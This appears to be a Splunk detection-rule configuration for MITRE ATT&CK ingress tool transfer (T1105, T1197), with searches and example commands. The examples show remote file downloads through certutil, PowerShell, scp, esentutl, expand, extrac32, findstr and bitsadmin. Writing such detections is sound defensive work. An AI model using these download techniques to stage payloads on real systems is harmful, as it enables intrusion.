[T1105: Certutil Remote File Download]
search = Image="*certutil.exe" AND (CommandLine="*-decode*" OR CommandLine="*-ping*" OR CommandLine="*-urldecode*" OR CommandLine="*-urlcache*" OR CommandLine="*-split*") | stats count by Computer,User,CommandLine
description = Process event associated with downloading a remote file to the local system.\
example) certutil -urlcache -split -f <remote file> <local file>\
Reference: https://attack.mitre.org/techniques/T1105/

[T1105: Powershell File Download]
search = source="WinEventLog:Microsoft-Windows-PowerShell/Operational" (ScriptBlockText="*DownloadFile*" OR ScriptBlockText="*Invoke-WebRequest*" OR ScriptBlockText="*System.Net.WebClient*" OR ScriptBlockText="*wget*-o*")| table Computer,ScriptBlockText
description = Event where Powershell is used to download software to the local system.\
example) Invoke-WebRequest -Uri "<url>" -OutFile "<file>"\
example2) (New-Object System.Net.WebClient).DownloadFile($url, $output)\
Reference: https://attack.mitre.org/techniques/T1105/

[T1105: SCP File Transfer]
search = sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" Image="*\\scp.exe" CommandLine="*@*:*" | table Computer,User,CommandLine
description = Process event associated to a scp file transfer. This can be used for file download or pushing a file to another system.\
example) scp user@1.1.1.1:/tmp/file.exe C:\Users\John\AppData\Local\Temp\file.exe\
Reference: https://attack.mitre.org/techniques/T1105/

[T1105: Esentutl.exe Remote File Download]
search = sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" Image="*\\esentutl.exe" CommandLine="*\\\\*\\*" CommandLine="*/y*" CommandLine="*/d*"| table Computer,User,Image,CommandLine
description = Process event associated to Esentutl.exe being used to download a remote file from a SMB/WebDAV share. #LOLBIN\
example) esentutl.exe /y \\<ip address>\webdav\file.exe /d C:\Temp\File.exe\
References: https://attack.mitre.org/software/S0404/\
https://lolbas-project.github.io/lolbas/Binaries/Esentutl/#download

[T1105: Expand.exe Remote File Download]
search = sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" Image="*\\expand.exe" CommandLine="*\\\\*\\*" | table Computer,User,Image,CommandLine
description = Process event associated to Expand.exe being used to download a remote file from a SMB/WebDAV share. #LOLBIN\
example) expand \\webdav\folder\file.bat c:\ADS\file.bat\
References: https://lolbas-project.github.io/lolbas/Binaries/Expand/\
https://attack.mitre.org/techniques/T1105/

[T1105: Extrac32.exe Remote File Download]
search = sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" Image="*\\extrac32.exe" CommandLine="*\\\\*\\*" CommandLine="*/c*"| table Computer,User,Image,CommandLine
description = Process event associated to extrac32.exe being used to download a remote file from a SMB/WebDAV share. #LOLBIN\
example) extrac32.exe /c \\<ip address>\webdav\file.exe C:\Temp\File.exe\
References: https://attack.mitre.org/techniques/T1105/\
https://lolbas-project.github.io/lolbas/Binaries/Extrac32/

[T1105: Findstr.exe Remote File Download]
search = sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" Image="*\\findstr.exe" CommandLine="*\\\\*\\*" CommandLine="*/v*"| table Computer,User,Image,CommandLine
description = Process event associated to findstr.exe being used to download a remote file from a SMB/WebDAV share. #LOLBIN\
example) findstr.exe /V /B \\<ip address>\webdav\file.exe > C:\Temp\File.exe\
example2) findstr.exe /V /L \\<ip address>\webdav\file.exe > C:\Temp\File.exe\
References: https://attack.mitre.org/techniques/T1105/\
https://lolbas-project.github.io/lolbas/Binaries/Findstr/

[T1197: Bitsadmin Download]
search = sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" Image="*bitsadmin.exe" AND (CommandLine="*/addfile*" OR CommandLine="*/download*" OR CommandLine="*/transfer*" OR CommandLine="*http*") | stats count by Computer,User,ParentImage,CommandLine
description = Process event associated with downloading a remote file to the local machine.\
example) bitsadmin.exe /transfer /Download /priority Foreground <remote server> <local file>\
Reference: https://attack.mitre.org/techniques/T1197/

[T1197: Bitsadmin Download PowerShell]
search = source="WinEventLog:Microsoft-Windows-PowerShell/Operational" ScriptBlockText="Start-BitsTransfer*" | table Computer,ScriptBlockText
description = Process event associated with downloading a remote file to the local machine. \
example) Start-BitsTransfer -Priority foreground -Source <remote file> -Destination <local file>\
Reference: https://attack.mitre.org/techniques/T1197/
